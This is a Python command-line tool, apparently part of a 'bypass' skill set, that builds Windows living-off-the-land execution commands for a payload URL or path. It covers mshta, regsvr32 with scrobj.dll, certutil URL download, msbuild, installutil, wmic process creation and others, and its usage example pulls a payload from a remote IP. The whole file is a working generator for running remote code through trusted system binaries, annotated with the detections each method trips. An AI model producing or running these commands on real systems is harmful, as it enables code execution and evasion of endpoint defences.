#!/usr/bin/env python3
"""Build LOLBin execution command lines from payload URL/path inputs.

Usage:
  python skills/bypass/scripts/lolbin_exec.py --lolbin mshta --payload-url http://10.10.10.10/payload.hta
"""

from __future__ import annotations

import argparse
import json
from pathlib import Path


NOTES = {
    "mshta": "Commonly monitored by command-line telemetry and AMSI/script logs.",
    "regsvr32": "Squiblydoo pattern often flagged by EDR and proxy logs.",
    "rundll32": "Suspicious export invocation can trigger command-line detections.",
    "certutil": "Download/decode actions are high-fidelity detections in many SOCs.",
    "wmic": "Deprecated but still monitored for remote process create abuse.",
    "msbuild": "Inline task execution may bypass app controls but is high-signal.",
    "installutil": "Abuse of installer hooks often mapped in LOLBAS detections.",
    "csc": "On-host compilation can trigger AMSI and behavior analytics.",
    "wscript": "Script host execution is broadly monitored in enterprise endpoints.",
    "cscript": "Console script host execution is broadly monitored in enterprise endpoints.",
}


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="LOLBin command builder.")
    parser.add_argument(
        "--lolbin",
        required=True,
        choices=[
            "mshta",
            "regsvr32",
            "rundll32",
            "certutil",
            "wmic",
            "msbuild",
            "installutil",
            "csc",
            "wscript",
            "cscript",
        ],
    )
    source = parser.add_mutually_exclusive_group(required=True)
    source.add_argument("--payload-url")
    source.add_argument("--payload-path")
    parser.add_argument("--output", help="Optional output file for JSON summary")
    return parser.parse_args()


def build_command(lolbin: str, payload: str, is_url: bool) -> str:
    if lolbin == "mshta":
        return f"mshta {payload}"
    if lolbin == "regsvr32":
        return f"regsvr32 /s /n /u /i:{payload} scrobj.dll"
    if lolbin == "rundll32":
        return f"rundll32 {payload},EntryPoint"
    if lolbin == "certutil":
        return f"certutil -urlcache -split -f {payload} payload.bin"
    if lolbin == "wmic":
        return f'wmic process call create "{payload}"'
    if lolbin == "msbuild":
        return f"msbuild {payload}"
    if lolbin == "installutil":
        return f"installutil /logfile= /LogToConsole=false /U {payload}"
    if lolbin == "csc":
        return f"csc /unsafe /out:loader.exe {payload}"
    if lolbin == "wscript":
        return f"wscript //B {payload}"
    return f"cscript //nologo {payload}"


def main() -> int:
    args = parse_args()
    payload = args.payload_url or args.payload_path
    command = build_command(args.lolbin, payload, bool(args.payload_url))
    payload_json = {
        "lolbin": args.lolbin,
        "command": command,
        "payload_source": "url" if args.payload_url else "path",
        "detection_notes": NOTES[args.lolbin],
        "reference": "LOLBAS project execution patterns",
    }

    print(command)
    print(json.dumps(payload_json, indent=2, ensure_ascii=False))

    if args.output:
        output_path = Path(args.output).resolve()
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(
            json.dumps(payload_json, indent=2, ensure_ascii=False) + "\n",
            encoding="utf-8",
        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
